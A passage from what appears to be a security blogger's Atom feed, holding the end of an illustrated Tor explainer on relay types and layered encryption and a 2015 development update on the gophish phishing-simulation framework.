          d="M -232.62393,367.1089 72.821982,1070.2735"
          id="path8903"
          inkscape:connector-curvature="0" />
       <path
          style="fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
          d="M 178.42094,1070.3735 492.84919,315.40803"
          id="path8905"
          inkscape:connector-curvature="0" />
       <path
          style="fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
          d="M 598.64615,315.96501 814.29764,589.51697"
          id="path8907"
          inkscape:connector-curvature="0" />
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="-840.00891"
          y="1171.5078"
          id="text9491"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="-840.00891"
            y="1171.5078"
            id="tspan9493"><tspan
              x="-840.00891"
              y="1171.5078"
              id="tspan9495"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Client</tspan></tspan></text>
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="-411.45981"
          y="1177.25"
          id="text9497"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="-411.45981"
            y="1177.25"
            id="tspan9499"><tspan
              x="-411.45981"
              y="1177.25"
              id="tspan9501"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Guard Relay</tspan></tspan></text>
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="2.2544701"
          y="1178.1072"
          id="text9503"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="2.2544701"
            y="1178.1072"
            id="tspan9505"><tspan
              x="2.2544701"
              y="1178.1072"
              id="tspan9507"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Middle Relay</tspan></tspan></text>
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="462.25449"
          y="1183.8215"
          id="text9509"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="462.25449"
            y="1183.8215"
            id="tspan9511"><tspan
              x="462.25449"
              y="1183.8215"
              id="tspan9513"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Exit Relay</tspan></tspan></text>
       <text
          xml:space="preserve"
          style="font-size:40px;font-style:normal;font-weight:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;font-stretch:normal;font-variant:normal"
          x="856.54022"
          y="1189.5358"
          id="text9515"
          sodipodi:linespacing="125%"><tspan
            sodipodi:role="line"
            x="856.54022"
            y="1189.5358"
            id="tspan9517"><tspan
              x="856.54022"
              y="1189.5358"
              id="tspan9519"
              style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff">Desination</tspan></tspan></text>
     </g>
   </svg>
</div>


<br/>


<ul>
<li><p><strong>Entry/Guard Relay</strong> &ndash; This is the entry point to the Tor network. Relays are selected to serve as guard relays after being around for a while, as well as having shown to be stable and having high bandwidth.<sup><a href="https://blog.torproject.org/blog/lifecycle-of-a-new-relay">1</a></sup></p></li>
<li><p><strong>Middle Relay</strong> &ndash; Middle relays are exactly that &ndash; middle nodes used to transport traffic from the guard relay to the exit relay. This prevents the guard and exit relay from knowing each other.</p></li>
<li><p><strong>Exit Relay</strong> &ndash; These relays are the exit point at the edge of the Tor network. These relays send traffic to the final destination intended by the client.</p></li>
</ul>


<p>Generally, it is safe to run a guard or middle relay on any VPS or shared server (such as  <a href="https://www.digitalocean.com/?refcode=2895d5b6c219">DigitalOcean</a> or <a href="https://aws.amazon.com/ec2/">EC2</a>), since all the server operators will see is harmless encrypted traffic (more on this later).</p>

<p>However, there are <a href="https://blog.torproject.org/blog/tips-running-exit-node-minimal-harassment">special responsibilities</a> to consider when running an exit node. Since exit relays send traffic directly to the end destination, any illicit activity done through Tor appears to come from the exit relay. This leads to the rare possibility of raids, abuse notices, or more.</p>

<p>If you meet an exit relay operator &ndash; thank them. <strong>They deserve it.</strong></p>

<h3>Why Onions?</h3>

<p>Now that we know how connections are routed through relays, how do we know we can actually <em>trust</em> relays? How can we be sure relays won&rsquo;t track who we&rsquo;re connecting to and sniff the data we send across the wire? The short answer is, <em>we don&rsquo;t have to!</em>.</p>

<p>Tor is designed to put as little trust in relays as possible. It does this through the use of <strong>encryption</strong>.</p>

<p>So what&rsquo;s the deal with all the references to onions? To answer this question, let&rsquo;s take a high-level look at how the encryption works when a client makes a connection through the Tor network.</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#3498DB"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">1</i>
</span>
The client encrypts the original data in such a way that only the exit relay can decrypt it.</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#3498DB"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">2</i>
</span>
This encrypted data is then encrypted again in such a way that only the middle relay can decrypt it.</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#3498DB"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">3</i>
</span>
Finally, this encrypted data is encrypted once more in such a way that only the guard relay can decrypt it.</p>

<div style="padding:10px;background:#3498DB;border-radius:5px;">
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   id="encryption"
   width="100%"
   height="191"
   viewBox="0 0 577 192"
   style="max-height:190px"
   onclick="s.reset().play();"
   version="1.0">
   <style
      id="style3946">
    .style0{
        fill:   none;
        stroke: #000000;
        stroke-width:   3;
        stroke-linejoin:    round;
    }
    .style1{
        fill:   none;
        stroke: #000000;
        stroke-width:   3;
    }
    .style2{
        font-size:  11.9px;
        line-height:    125%;
        letter-spacing: 0px;
        word-spacing:   0px;
        fill:   #000000;
        font-family:    Sans;
    }
    .style3{
        font-size:  11.9px;
    }
 </style>
   <metadata
      id="metadata1928">
     <rdf:RDF>
       <cc:Work
          rdf:about="">
         <dc:format>image/svg+xml</dc:format>
         <dc:type
            rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
         <dc:title></dc:title>
       </cc:Work>
     </rdf:RDF>
   </metadata>
   <defs
      id="defs1926" />
   <path
      id="path1934"
      d="m 354.4,37.8 c 12.5,0 22.9,34.2 22.9,75.7 0,41.6 -10.2,76.4 -22.7,76.4 -12.5,0 -22.7,-34.9 -22.7,-76.4 0,-41.5 9.9,-75.7 22.5,-75.7 z m 0,0 197,-0.3 c 11,0 24.3,34 24.3,75.8 0,41.9 -13,76.7 -24,76.7 l -197.2,-0.1"
      inkscape:connector-curvature="0"
      class="style0"
      style="fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;fill-opacity:1;stroke-opacity:1" />
   <path
      id="path1934-1"
      d="m 292.9,56.4 c 4.6,0 8.5,25.5 8.5,56.7 0,31.1 -3.7,57.2 -8.4,57.2 -4.6,0 -8.4,-26.0 -8.4,-57.2 0,-31.1 3.7,-56.7 8.4,-56.7 z m 0,0 73.6,-0.2 c 4.1,0 9.1,25.4 9.1,56.8 0,31.3 -4.8,57.4 -8.9,57.4 l -73.6,-0.1"
      inkscape:connector-curvature="0"
      class="style0"
      style="fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;stroke-miterlimit:4;stroke-dasharray:none;fill-opacity:1;stroke-opacity:1" />
   <path
      id="path1934-1-7"
      d="m 254.9,82.9 c 2.6,0 4.9,14.9 4.9,33.3 0,18.2 -2.1,33.6 -4.8,33.6 -2.6,0 -4.8,-15.2 -4.8,-33.6 0,-18.2 2.1,-33.3 4.8,-33.3 z m 0,0 42.3,-0.1 c 2.3,0 5.2,14.9 5.2,33.3 0,18.4 -2.7,33.7 -5.1,33.7 l -42.3,0"
      inkscape:connector-curvature="0"
      class="style0"
      style="fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;stroke-miterlimit:4;stroke-dasharray:none;stroke-opacity:1;fill-opacity:1" />
   <path
      id="path1934-1-4"
      d="m 228.2,97.7 c 1.8,0 3.4,9.2 3.4,20.5 0,11.3 -1.5,20.7 -3.3,20.7 -1.8,0 -3.3,-9.4 -3.3,-20.7 0,-11.3 1.4,-20.5 3.3,-20.5 z m 0,0 29.4,-0.1 c 1.6,0 3.6,9.2 3.6,20.5 0,11.4 -1.9,20.7 -3.5,20.7 l -29.4,0"
      inkscape:connector-curvature="0"
      class="style0"
      style="fill:#ffffff;stroke:#4183d7;stroke-width:2.2;stroke-linejoin:round;stroke-opacity:1;fill-opacity:1" />
   <text
      xml:space="preserve"
      x="-4.7"
      y="10.2"
      id="text4004"
      style="font-size:14.0px;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff"><tspan
        sodipodi:role="line"
        x="-4.7"
        y="10.2"
        id="tspan4006"
        style="font-size:12px;fill:#ffffff"><tspan
          x="-4.7"
          y="10.2"
          id="tspan4008"
          style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;font-size:12px;fill:#ffffff">Guard Relay Encryption</tspan></tspan></text>
   <text
      xml:space="preserve"
      x="-5.8"
      y="32.1"
      id="text3998"
      style="font-size:14.1px;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff"><tspan
        sodipodi:role="line"
        x="-5.8"
        y="32.1"
        id="tspan4000"
        style="font-size:12px;fill:#ffffff"><tspan
          x="-5.8"
          y="32.1"
          id="tspan4002"
          style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;font-size:12px;fill:#ffffff">Middle Relay Encryption</tspan></tspan></text>
   <text
      xml:space="preserve"
      x="-5.1"
      y="52.7"
      id="text3992"
      style="font-size:14.0px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;fill:#ffffff"><tspan
        sodipodi:role="line"
        x="-5.1"
        y="52.7"
        id="tspan3994"
        style="font-size:12px;fill:#ffffff"><tspan
          x="-5.1"
          y="52.7"
          id="tspan3996"
          style="font-size:12px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;fill:#ffffff">Exit Relay Encryption</tspan></tspan></text>
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 548.4,36.3 c 0,0 41.8,75.0 0,153.5"
      id="path6775"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 533.9,37.6 c 0,0 41.8,75.0 0,153.5"
      id="path6775-2"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 517.8,37.7 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-4"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 503.3,36.7 c 0,0 41.8,75.0 0,153.5"
      id="path6775-5"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 487.1,36.8 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-2"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 470.8,37.9 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-8"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 451.6,39.1 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-9"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 433.6,35.6 c 0,0 41.8,75.0 0,153.5"
      id="path6775-23"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 414.4,36.7 c 0,0 41.8,75.0 0,153.5"
      id="path6775-62"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 396.1,36.7 c 0,0 41.8,75.0 0,153.5"
      id="path6775-57"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 380.0,36.8 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-827"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 360.4,170.4 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 353.0,170.9 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-0"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 344.8,171.8 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 336.7,170.7 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-5"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 328.7,170.7 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-2"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 320.1,169.6 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-7"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 311.5,169.6 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-6"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 303.5,171.3 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-78"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 293.1,149.8 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 288.8,148.9 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-7"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 283.7,148.9 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-8"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 278.5,149.5 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-1"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 273.9,149.8 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-6"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 268.8,148.6 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-0"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 263.3,148.9 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-9"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 254.8,97.7 c 0,0 8.0,17.9 0,41.2"
      id="path7074"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 252.7,97.9 c 0,0 8.0,17.9 0,41.2"
      id="path7074-8"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 250.6,97.4 c 0,0 8.0,17.9 0,41.2"
      id="path7074-9"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 248.6,96.8 c 0,0 8.0,17.9 0,41.2"
      id="path7074-0"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 246.1,97.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-00"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 243.6,98.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-7"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 241.1,98.1 c 0,0 8.0,17.9 0,41.2"
      id="path7074-2"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 238.7,97.9 c 0,0 8.0,17.9 0,41.2"
      id="path7074-5"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 236.3,97.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-52"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 233.8,98.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-1"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 231.5,98.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-4"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none"
      d="m 345.5,37.5 -153.5,0 -51.4,-29.7"
      id="path7159"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none"
      d="m 287.0,56.4 -98.3,0 -49.3,-28.2"
      id="path7161"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 248.7,82.2 -57.3,0 -53.0,-28.3"
      id="path7163"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none"
      d="m 221.7,117.7 -33.2,0 -55.3,-31.9"
      id="path7165"
      inkscape:connector-curvature="0" />
   <text
      xml:space="preserve"
      x="-5.1"
      y="80.6"
      id="text3992-8"
      style="font-size:14.0px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;fill:#ffffff;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"><tspan
        sodipodi:role="line"
        x="-5.1"
        y="80.6"
        id="tspan3994-6"
        style="font-size:12px;fill:#ffffff">Original Data</tspan></text>
 </svg>
       </div>


<br/>


<p>This means that we have wrapped our original data in layers of encryption, much like an onion is wrapped in layers of&hellip;well, more onion, I guess.</p>

<p>By doing this, each relay only has the information it needs to know &ndash; where it got the encrypted data from, and where to send it to next. Encrypting data this way is beneficial to both parties: client traffic isn&rsquo;t compromised and relays can&rsquo;t be held liable for data they can&rsquo;t see.</p>

<blockquote><p>Note: It&rsquo;s important to remember that exit relays <strong>can see the original data sent by the client</strong>, since they have to pass that data to the destination. This means that, if credentials are passed over HTTP, FTP, or other cleartext protocols, the exit relays can sniff the traffic!</p></blockquote>

<h3>Next Steps</h3>

<p>Our journey into the operation of Tor is just beginning. In future posts, we&rsquo;ll take a look at how the Tor network is organized, discuss the differences between relays and bridges, take a deep-dive into how exactly the encryption works, take a step-by-step view of what happens behind the scenes when you start up your Tor client for the first time, and more.</p>

<p>We have a lot to cover! Until then, feel free to read up on the official <a href="https://gitweb.torproject.org/torspec.git/tree/">Tor specifications</a>.</p>

<p>As always, please let me know if you have any questions or comments below!</p>

<p>Jordan</p>

<div>
<script>
d= new Vivus('earth', {type: 'oneByOne', duration: 30, start: 'inViewport', forceRender: false, dashGap: 20});
s= new Vivus('encryption', {type: 'async', duration: 30, start: 'inViewport', forceRender: false, dashGap: 20});
e= new Vivus('network', {type: 'oneByOne', duration: 30, start: 'inViewport', forceRender: false, dashGap: 20});
</script>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gophish Update: Getting Closer to Alpha!]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/02/26/gophish-update-getting-closer-to-alpha/"/>
    <updated>2015-02-26T20:50:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/26/gophish-update-getting-closer-to-alpha</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/gophish_purple.png"/></p>

<h3>Introduction</h3>

<p>It&rsquo;s been a busy couple of months!</p>

<p>I thought it would be worth providing a long-overdue update into the development status of <a href="http://github.com/jordan-wright/gophish">gophish</a>. Overall, the project is getting closer to beta status every day, and I&rsquo;m hoping to see a <a href="https://github.com/jordan-wright/gophish/milestones">0.1 release</a> at the end of March.</p>

<p>Without further ado, let&rsquo;s dive in and see where we&rsquo;re at.</p>

<!--more-->


<h3>Design</h3>

<p>I moved away from the previous black and white look to a friendlier color scheme using the fantastic <a href="http://designmodo.github.io/Flat-UI/">Flat-UI</a> package from DesignModo.</p>

<h3>Features</h3>

<p>My goal is to make using gophish both easy-to-use and powerful. With this in mind, I&rsquo;ve implemented some neat features to make setting up awesome campaigns as simple as possible.</p>

<p>Let&rsquo;s take a look at a few:</p>

<h4>WYSIWYG Editing of HTML Templates</h4>

<p>You can make pixel perfect email and landing page templates and customize the content seamlessly. While I started with some <code>contenteditable</code> hacks, I couldn&rsquo;t find a reliable way to allow full page rendering (without opening up security issues or design incompatibility problems). So, I looked around and found that <a href="http://ckeditor.com">CKEditor</a> which takes care of this and more!</p>

<p>Now we can switch between a raw HTML source view and a fully rendered view in just one-click. Want to see what a template would look like full-screen? Also no problem!</p>

<p><img src="http://jordan-wright.github.io/images/blog/gophish_screenshots/gophish_template.gif"/></p>

<h4>Email Attachments</h4>

<p>Sending emails with links in them is great, but if we can&rsquo;t add &ldquo;malicious&rdquo; attachments to emails we send, then we miss a <em>huge</em> attack tactic deployed against our users. I&rsquo;m excited to report that attaching files to email templates is just a matter of selecting the &ldquo;Add Files&rdquo; button on the email template modal and choosing the file you want to attach. Easy as that!</p>

<h4>Bulk Importing of Users</h4>

<p>Adding users to a group manually is a <em>pain</em>. So, I&rsquo;ve implemented bulk inserting that accepts a CSV file, and adds the users automatically. Right now, it allows for the following fields:</p>

<ul>
<li>First Name</li>
<li>Last Name</li>
<li>Email</li>
<li>Position</li>
</ul>


<p><img src="http://jordan-wright.github.io/images/blog/gophish_screenshots/gophish_group.gif"/></p>

<h4>Campaign Results Dashboard</h4>

<p>Executing campaigns isn&rsquo;t helpful if you don&rsquo;t have a way to see the results. This is why I&rsquo;ve been working on a campaign results dashboard that will serve as a one-stop-shop for viewing campaign results. The plan is to start by having information about the campaign itself, such as clicks over time and overall success rate. However, I want to expand this to also include information about the user, such as browser plugin information, demographics and location, etc.</p>

<p><img src="http://jordan-wright.github.io/images/blog/gophish_screenshots/gophish_campaign_results.gif"/></p>

<h4>Full API Support</h4>

<p>From the get-go, gophish was <strong>designed for automation</strong>. Setting up campaigns, importing users, getting results can all be done manually through the Web UI. However, all the UI does is call out to the API. For darn-near <em>everything</em>.</p>

<p>To take a look at the API documentation, just load up gophish and head over to <code>/api</code>!</p>

<h4>Coming Soon</h4>

<p>While I&rsquo;m proud of all that&rsquo;s been accomplished with gophish so far, it&rsquo;s not even close to being done.</p>

<p>Here are just a few of the <em>many</em> features coming down the pipeline to get excited about:</p>

<ul>
<li>A more fleshed out Campaign Results dashboard (<span><i class="fa fa-heart-o"></i></span> metrics)</li>
<li>Ability to schedule campaigns in advance</li>
<li>Email tracking &ndash; know when an email is opened!</li>
<li>The ability to clone a landing page template with one click</li>
<li>Support for importing emails from the &ldquo;Source&rdquo; of an existing email (or hopefully even an IMAP service directly!)</li>
<li>&ldquo;Teams&rdquo; support to share and coordinate phishing campaigns</li>
<li>Realtime updates to campaign results dashboard</li>
<li>Client API libraries (eg Python)</li>
</ul>


<h3>Conclusion</h3>

<p>Gophish development continues to push forward as much as possible. While I&rsquo;m balancing time between a few different projets, I hope to get gophish alpha out the door as soon as possible. As always, please don&rsquo;t hesitate to let me know if you have any questions or comments! Also, if you use gophish and have any ideas/issues, let me know on <a href="http://github.com/jordan-wright/gophish/issues">Github</a>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Web Scraping Hotel Prices for Fun and Savings]]></title>
